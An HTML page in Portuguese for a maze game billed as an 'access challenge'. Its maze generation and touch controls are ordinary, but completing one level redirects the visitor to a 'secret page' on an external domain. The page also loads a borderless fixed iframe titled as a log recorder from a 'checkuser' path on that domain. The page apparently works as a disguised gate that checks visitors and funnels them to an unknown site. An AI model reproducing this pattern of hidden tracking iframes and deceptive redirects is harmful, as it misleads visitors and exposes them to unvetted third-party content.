<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Labirinto Desafio de Acesso</title>
    
    <style>
        :root {
            /* Vari√°veis de cor padr√£o para o tema 1 */
            --bg-color: #282c34;
            --border-color: #61dafb;
            --wall-color: #61dafb;
            --path-color: #333;
            --player-color: #e0b0ff;
            --start-color: #4CAF50;
            --start-border-color: #388E3C;
            --end-color: #f44336;
            --end-border-color: #D32F2F;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: var(--bg-color);
            color: white;
            font-family: Arial, sans-serif;
            touch-action: none; /* Impede comportamentos padr√£o do touch como zoom */
            overflow: hidden; /* Evita scroll durante o arraste */
        }

        h1 {
            margin-bottom: 20px;
            text-align: center;
            padding: 0 10px;
        }

        #game-container {
            position: relative;
            border: 2px solid var(--border-color);
            overflow: hidden;
            background-color: var(--path-color);
            box-sizing: content-box;
            user-select: none; /* Impede sele√ß√£o de texto ao arrastar */
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        #maze {
            display: grid;
            background-color: var(--path-color);
            touch-action: none; /* Desabilita a√ß√µes padr√£o do touch no labirinto */
        }

        .wall {
            background-color: var(--wall-color);
        }

        .path {
            background-color: var(--path-color);
        }

        #player {
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: var(--player-color);
            border-radius: 50%;
            transition: left 0.05s linear, top 0.05s linear;
            z-index: 10; /* Garante que o jogador fique acima de tudo */
        }

        #start-point, #end-point {
            position: absolute;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            box-sizing: border-box;
            z-index: 5;
        }

        #start-point {
            background-color: var(--start-color);
            border: 2px solid var(--start-border-color);
        }

        #end-point {
            background-color: var(--end-color);
            border: 2px solid var(--end-border-color);
        }

        #info {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            padding: 0 10px;
            text-align: center;
        }

        #info p {
            font-size: 1.2em;
            margin: 0;
        }

        .buttons-container {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
        }

        button {
            padding: 10px 20px;
            font-size: 1em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            min-width: 120px;
        }

        button:hover {
            background-color: #0056b3;
        }

        button:active {
            transform: scale(0.98);
        }

        #controls-info {
            margin-top: 10px;
            font-size: 0.9em;
            color: #aaa;
            text-align: center;
            max-width: 300px;
        }

        /* Estilo para indicador de arraste em dispositivos m√≥veis */
        .drag-indicator {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 123, 255, 0.8);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.9em;
            z-index: 100;
            display: none;
            pointer-events: none;
        }

        @media (max-width: 768px) {
            .drag-indicator {
                display: block;
            }
            
            h1 {
                font-size: 1.5em;
            }
            
            #info p {
                font-size: 1em;
            }
            
            button {
                padding: 8px 16px;
                font-size: 0.9em;
                min-width: 100px;
            }
            
            #controls-info {
                font-size: 0.8em;
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 1.3em;
            }
            
            .buttons-container {
                gap: 10px;
            }
            
            button {
                padding: 6px 12px;
                font-size: 0.85em;
                min-width: 90px;
            }
        }
    </style>
</head>
<body>
    <h1>Labirinto Desafio de Acesso</h1>
    <div id="game-container">
        <div id="maze"></div>
        <div id="player"></div>
        <div id="start-point"></div>
        <div id="end-point"></div>
    </div>
    <div id="info">
        <p>Fase: <span id="level">1</span></p>
        <p>Tempo: <span id="time">00:00</span></p>
        <div class="buttons-container">
            <button id="restart-button">Reiniciar</button>
            <button id="next-level-button" style="display: none;">Pr√≥xima Fase</button>
        </div>
        <div id="controls-info">
            üí° Use as setas do teclado ou arraste o labirinto para mover
        </div>
    </div>
    
    <div class="drag-indicator" id="drag-indicator">
        Arraste para mover
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const URL_DE_REDIRECIONAMENTO = 'https://wazzimagiygg.com/wikinotpedia.html?uid=articlesdoc';
            const FASES_NECESSARIAS = 1; // O n√∫mero de fases que o jogador precisa completar
            
            const mazeContainer = document.getElementById('maze');
            const gameContainer = document.getElementById('game-container');
            const player = document.getElementById('player');
            const startPoint = document.getElementById('start-point');
            const endPoint = document.getElementById('end-point');
            const timeDisplay = document.getElementById('time');
            const levelDisplay = document.getElementById('level');
            const restartButton = document.getElementById('restart-button');
            const nextLevelButton = document.getElementById('next-level-button');
            const dragIndicator = document.getElementById('drag-indicator');

            const cellSize = 20; // Tamanho de cada c√©lula em pixels

            let maze = [];
            let numRows, numCols;
            let playerPos = { x: 0, y: 0 };
            let startPos = { x: 0, y: 0 };
            let endPos = { x: 0, y: 0 };

            let startTime;
            let timerInterval;
            let gameActive = false;
            let currentLevel = 1;
            
            // Vari√°veis para controle de arraste (touch/swipe)
            let touchStartX = 0;
            let touchStartY = 0;
            let touchEndX = 0;
            let touchEndY = 0;
            let isDragging = false;
            let dragThreshold = 10; // M√≠nimo de pixels para considerar um arraste
            let lastMoveTime = 0;
            let moveCooldown = 100; // Cooldown em ms entre movimentos por arraste

            // Configura√ß√µes de cores para diferentes temas
            const colorThemes = [
                { // Tema 1: Azul Ciano (Padr√£o)
                    '--bg-color': '#282c34',
                    '--border-color': '#61dafb',
                    '--wall-color': '#61dafb',
                    '--path-color': '#333',
                    '--player-color': '#e0b0ff',
                    '--start-color': '#4CAF50',
                    '--start-border-color': '#388E3C',
                    '--end-color': '#f44336',
                    '--end-border-color': '#D32F2F',
                },
                { // Tema 2: Verde Floresta
                    '--bg-color': '#224036',
                    '--border-color': '#6cc091',
                    '--wall-color': '#6cc091',
                    '--path-color': '#1a2a22',
                    '--player-color': '#d1f0c4',
                    '--start-color': '#A5D6A7',
                    '--start-border-color': '#66BB6A',
                    '--end-color': '#FF8A65',
                    '--end-border-color': '#FF5722',
                },
                { // Tema 3: Roxo Escuro
                    '--bg-color': '#3a2b4f',
                    '--border-color': '#9b59b6',
                    '--wall-color': '#9b59b6',
                    '--path-color': '#281d3a',
                    '--player-color': '#f3e5f5',
                    '--start-color': '#81C784',
                    '--start-border-color': '#4CAF50',
                    '--end-color': '#EF9A9A',
                    '--end-border-color': '#E57373',
                },
                { // Tema 4: Laranja P√¥r do Sol
                    '--bg-color': '#4d392b',
                    '--border-color': '#ffa726',
                    '--wall-color': '#ffa726',
                    '--path-color': '#382a1f',
                    '--player-color': '#ffe0b2',
                    '--start-color': '#FFD54F',
                    '--start-border-color': '#FFC107',
                    '--end-color': '#FF7043',
                    '--end-border-color': '#F4511E',
                }
            ];

            // --- Algoritmo de Gera√ß√£o de Labirinto (DFS) ---
            function generateMaze(rows, cols) {
                numRows = rows % 2 === 0 ? rows + 1 : rows;
                numCols = cols % 2 === 0 ? cols + 1 : cols;

                const newMaze = Array(numRows).fill(0).map(() => Array(numCols).fill(1));

                let startRow = 1;
                let startCol = 1;

                const stack = [[startRow, startCol]];
                newMaze[startRow][startCol] = 0;

                while (stack.length > 0) {
                    const [currentRow, currentCol] = stack[stack.length - 1];

                    const neighbors = [];
                    // Cima
                    if (currentRow - 2 > 0 && newMaze[currentRow - 2][currentCol] === 1) {
                        neighbors.push([currentRow - 2, currentCol]);
                    }
                    // Baixo
                    if (currentRow + 2 < numRows - 1 && newMaze[currentRow + 2][currentCol] === 1) {
                        neighbors.push([currentRow + 2, currentCol]);
                    }
                    // Esquerda
                    if (currentCol - 2 > 0 && newMaze[currentRow][currentCol - 2] === 1) {
                        neighbors.push([currentRow, currentCol - 2]);
                    }
                    // Direita
                    if (currentCol + 2 < numCols - 1 && newMaze[currentRow][currentCol + 2] === 1) {
                        neighbors.push([currentRow, currentCol + 2]);
                    }

                    if (neighbors.length > 0) {
                        const [nextRow, nextCol] = neighbors[Math.floor(Math.random() * neighbors.length)];

                        newMaze[nextRow][nextCol] = 0;
                        newMaze[currentRow + (nextRow - currentRow) / 2][currentCol + (nextCol - currentCol) / 2] = 0;

                        stack.push([nextRow, nextCol]);
                    } else {
                        stack.pop();
                    }
                }

                startPos = { x: 1, y: 1 };
                newMaze[startPos.y][startPos.x] = 0;

                let foundEnd = false;
                while (!foundEnd) {
                    const randY = Math.floor(Math.random() * (numRows - 2)) + 1;
                    const randX = Math.floor(Math.random() * (numCols - 2)) + 1;

                    if (newMaze[randY][randX] === 0 && (Math.abs(randY - startPos.y) + Math.abs(randX - startPos.x)) > (numRows + numCols) / 4) {
                        endPos = { x: randX, y: randY };
                        foundEnd = true;
                    }
                }
                newMaze[endPos.y][endPos.x] = 0;

                return newMaze;
            }

            // Aplica o tema de cores ao DOM
            function applyColorTheme(theme) {
                const root = document.documentElement;
                for (const [prop, value] of Object.entries(theme)) {
                    root.style.setProperty(prop, value);
                }
            }

            // Cria o labirinto no HTML
            function drawMaze() {
                mazeContainer.innerHTML = '';
                mazeContainer.style.gridTemplateColumns = `repeat(${numCols}, ${cellSize}px)`;
                mazeContainer.style.gridTemplateRows = `repeat(${numRows}, ${cellSize}px)`;

                for (let row = 0; row < numRows; row++) {
                    for (let col = 0; col < numCols; col++) {
                        const cell = document.createElement('div');
                        cell.classList.add(maze[row][col] === 1 ? 'wall' : 'path');
                        mazeContainer.appendChild(cell);
                    }
                }

                // Posiciona o ponto de in√≠cio
                startPoint.style.left = `${startPos.x * cellSize}px`;
                startPoint.style.top = `${startPos.y * cellSize}px`;
                startPoint.style.width = `${cellSize}px`;
                startPoint.style.height = `${cellSize}px`;
                startPoint.textContent = 'In√≠cio';
                startPoint.style.fontSize = `${cellSize * 0.4}px`;
                startPoint.style.lineHeight = `${cellSize}px`;

                // Posiciona o ponto final
                endPoint.style.left = `${endPos.x * cellSize}px`;
                endPoint.style.top = `${endPos.y * cellSize}px`;
                endPoint.style.width = `${cellSize}px`;
                endPoint.style.height = `${cellSize}px`;
                endPoint.textContent = 'Fim';
                endPoint.style.fontSize = `${cellSize * 0.4}px`;
                endPoint.style.lineHeight = `${cellSize}px`;
            }

            // Atualiza a posi√ß√£o visual do jogador
            function updatePlayerPosition() {
                player.style.left = `${playerPos.x * cellSize}px`;
                player.style.top = `${playerPos.y * cellSize}px`;
            }

            // Inicia o contador de tempo
            function startTimer() {
                startTime = Date.now();
                timerInterval = setInterval(() => {
                    const elapsedTime = Date.now() - startTime;
                    const minutes = Math.floor(elapsedTime / 60000);
                    const seconds = Math.floor((elapsedTime % 60000) / 1000);
                    timeDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
                }, 1000);
            }

            // Para o contador de tempo
            function stopTimer() {
                clearInterval(timerInterval);
            }

            // Verifica se a nova posi√ß√£o √© v√°lida (n√£o √© uma parede)
            function isValidMove(x, y) {
                return x >= 0 && x < numCols && y >= 0 && y < numRows && maze[y][x] === 0;
            }

            // Move o jogador na dire√ß√£o especificada
            function movePlayer(direction) {
                if (!gameActive) return;
                
                let newX = playerPos.x;
                let newY = playerPos.y;

                switch (direction) {
                    case 'up':
                        newY--;
                        break;
                    case 'down':
                        newY++;
                        break;
                    case 'left':
                        newX--;
                        break;
                    case 'right':
                        newX++;
                        break;
                    default:
                        return;
                }

                if (isValidMove(newX, newY)) {
                    playerPos.x = newX;
                    playerPos.y = newY;
                    updatePlayerPosition();
                    checkWin();
                    return true;
                }
                return false;
            }

            // Lida com a movimenta√ß√£o do jogador pelo teclado
            function handleKeyDown(event) {
                if (!gameActive) return;

                let moved = false;
                
                switch (event.key) {
                    case 'ArrowUp':
                    case 'w':
                    case 'W':
                        moved = movePlayer('up');
                        break;
                    case 'ArrowDown':
                    case 's':
                    case 'S':
                        moved = movePlayer('down');
                        break;
                    case 'ArrowLeft':
                    case 'a':
                    case 'A':
                        moved = movePlayer('left');
                        break;
                    case 'ArrowRight':
                    case 'd':
                    case 'D':
                        moved = movePlayer('right');
                        break;
                    default:
                        return;
                }
                
                // Impede o scroll da p√°gina com as setas
                if (moved && ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'w', 'W', 'a', 'A', 's', 'S', 'd', 'D'].includes(event.key)) {
                    event.preventDefault();
                }
            }

            // Lida com eventos de toque para dispositivos m√≥veis
            function handleTouchStart(event) {
                if (!gameActive) return;
                
                event.preventDefault();
                isDragging = true;
                
                const touch = event.touches[0];
                touchStartX = touch.clientX;
                touchStartY = touch.clientY;
                
                // Mostra o indicador de arraste brevemente
                dragIndicator.style.opacity = '1';
            }

            function handleTouchMove(event) {
                if (!gameActive || !isDragging) return;
                
                event.preventDefault();
                
                const touch = event.touches[0];
                touchEndX = touch.clientX;
                touchEndY = touch.clientY;
            }

            function handleTouchEnd(event) {
                if (!gameActive || !isDragging) return;
                
                event.preventDefault();
                isDragging = false;
                
                // Calcula a diferen√ßa do arraste
                const diffX = touchEndX - touchStartX;
                const diffY = touchEndY - touchStartY;
                
                // Verifica se o arraste foi significativo o suficiente
                if (Math.abs(diffX) < dragThreshold && Math.abs(diffY) < dragThreshold) {
                    // Toque simples (n√£o arraste) - n√£o faz nada ou pode implementar clique
                    return;
                }
                
                // Determina a dire√ß√£o baseada no maior movimento
                const now = Date.now();
                if (now - lastMoveTime < moveCooldown) {
                    return; // Ainda est√° no cooldown
                }
                
                lastMoveTime = now;
                
                if (Math.abs(diffX) > Math.abs(diffY)) {
                    // Movimento horizontal
                    if (diffX > 0) {
                        movePlayer('right');
                    } else {
                        movePlayer('left');
                    }
                } else {
                    // Movimento vertical
                    if (diffY > 0) {
                        movePlayer('down');
                    } else {
                        movePlayer('up');
                    }
                }
                
                // Esconde o indicador de arraste
                dragIndicator.style.opacity = '0';
            }

            // Verifica se o jogador chegou ao final E gerencia o redirecionamento
            function checkWin() {
                if (playerPos.x === endPos.x && playerPos.y === endPos.y) {
                    stopTimer();
                    gameActive = false;
                    
                    // --- L√ìGICA DE DESAFIO/REDIRECIONAMENTO ---
                    if (currentLevel < FASES_NECESSARIAS) {
                        // AINDA N√ÉO √â A √öLTIMA FASE
                        alert(`Parab√©ns! Voc√™ completou a Fase ${currentLevel} em ${timeDisplay.textContent}! Prepare-se para a pr√≥xima.`);
                        nextLevelButton.style.display = 'inline-block'; // Mostra o bot√£o para ir para a pr√≥xima fase
                    } else {
                        // √öLTIMA FASE CONCLU√çDA! Aciona o redirecionamento.
                        alert(`üéâ Desafio Conclu√≠do! Voc√™ completou as ${FASES_NECESSARIAS} fases. Redirecionando para a p√°gina secreta...`);
                        
                        // Esconde todos os bot√µes e informa√ß√µes antes de redirecionar
                        restartButton.style.display = 'none';
                        nextLevelButton.style.display = 'none';
                        
                        // Redireciona com um pequeno atraso
                        setTimeout(() => {
                            window.location.href = URL_DE_REDIRECIONAMENTO;
                        }, 2000); // 2 segundos de atraso para o usu√°rio ler o alerta
                    }
                }
            }

            // Inicia uma nova fase
            function startNewLevel() {
                currentLevel++;
                levelDisplay.textContent = currentLevel;

                // Aumenta o tamanho do labirinto a cada fase (torna o desafio maior)
                let mazeRows = 15 + (currentLevel - 1) * 2;
                let mazeCols = 25 + (currentLevel - 1) * 2;

                mazeRows = mazeRows % 2 === 0 ? mazeRows + 1 : mazeRows;
                mazeCols = mazeCols % 2 === 0 ? mazeCols + 1 : mazeCols;

                maze = generateMaze(mazeRows, mazeCols);
                drawMaze();

                playerPos = { ...startPos };
                updatePlayerPosition();

                // Ajusta o tamanho do container do jogo
                gameContainer.style.width = `${numCols * cellSize}px`;
                gameContainer.style.height = `${numRows * cellSize}px`;

                // Aplica um tema de cor aleat√≥rio
                const randomThemeIndex = Math.floor(Math.random() * colorThemes.length);
                applyColorTheme(colorThemes[randomThemeIndex]);

                timeDisplay.textContent = '00:00';
                gameActive = true;
                
                // Verifica se estamos na √∫ltima fase e muda o texto do bot√£o "Pr√≥xima Fase"
                if (currentLevel === FASES_NECESSARIAS) {
                    nextLevelButton.textContent = 'Concluir Desafio';
                } else {
                    nextLevelButton.textContent = 'Pr√≥xima Fase';
                }
                
                startTimer();
                nextLevelButton.style.display = 'none'; // Esconde o bot√£o de pr√≥xima fase
            }

            // Reinicia o jogo (vai para a fase 1)
            function restartGame() {
                stopTimer();
                currentLevel = 0; // Ser√° incrementado para 1 em startNewLevel
                startNewLevel();
            }

            // Configura os event listeners para touch
            function setupTouchEvents() {
                // Para o container do jogo
                gameContainer.addEventListener('touchstart', handleTouchStart, { passive: false });
                gameContainer.addEventListener('touchmove', handleTouchMove, { passive: false });
                gameContainer.addEventListener('touchend', handleTouchEnd, { passive: false });
                
                // Para o documento inteiro (para evitar comportamentos padr√£o)
                document.addEventListener('touchmove', function(e) {
                    if (isDragging) {
                        e.preventDefault();
                    }
                }, { passive: false });
                
                // Adiciona tamb√©m eventos de mouse para desktop (para testes)
                let mouseDown = false;
                let mouseStartX = 0;
                let mouseStartY = 0;
                
                gameContainer.addEventListener('mousedown', function(e) {
                    if (!gameActive) return;
                    mouseDown = true;
                    mouseStartX = e.clientX;
                    mouseStartY = e.clientY;
                    e.preventDefault();
                });
                
                document.addEventListener('mousemove', function(e) {
                    if (!mouseDown || !gameActive) return;
                    e.preventDefault();
                });
                
                document.addEventListener('mouseup', function(e) {
                    if (!mouseDown || !gameActive) return;
                    
                    const diffX = e.clientX - mouseStartX;
                    const diffY = e.clientY - mouseStartY;
                    
                    if (Math.abs(diffX) < dragThreshold && Math.abs(diffY) < dragThreshold) {
                        mouseDown = false;
                        return;
                    }
                    
                    const now = Date.now();
                    if (now - lastMoveTime < moveCooldown) {
                        mouseDown = false;
                        return;
                    }
                    
                    lastMoveTime = now;
                    
                    if (Math.abs(diffX) > Math.abs(diffY)) {
                        if (diffX > 0) {
                            movePlayer('right');
                        } else {
                            movePlayer('left');
                        }
                    } else {
                        if (diffY > 0) {
                            movePlayer('down');
                        } else {
                            movePlayer('up');
                        }
                    }
                    
                    mouseDown = false;
                    e.preventDefault();
                });
            }

            // Event Listeners
            document.addEventListener('keydown', handleKeyDown);
            restartButton.addEventListener('click', restartGame);
            nextLevelButton.addEventListener('click', startNewLevel);

            // Configura eventos de toque
            setupTouchEvents();

            // Inicializa√ß√£o do jogo
            initGame();

            function initGame() {
                restartGame(); // Inicia a primeira fase
                
                // Configura transi√ß√£o do indicador de arraste
                setTimeout(() => {
                    dragIndicator.style.transition = 'opacity 0.5s ease';
                    dragIndicator.style.opacity = '0';
                }, 3000);
            }
        });
    </script>

    <iframe 
    src="https://wazzimagiygg.com/admin/checkuser/universalcheckuser" 
    style="width: 300px; height: 150px; border: none; position: fixed; bottom: 10px; right: 10px; z-index: 9999;"
    title="Registrador de Logs">
</iframe>
</body>
</html>
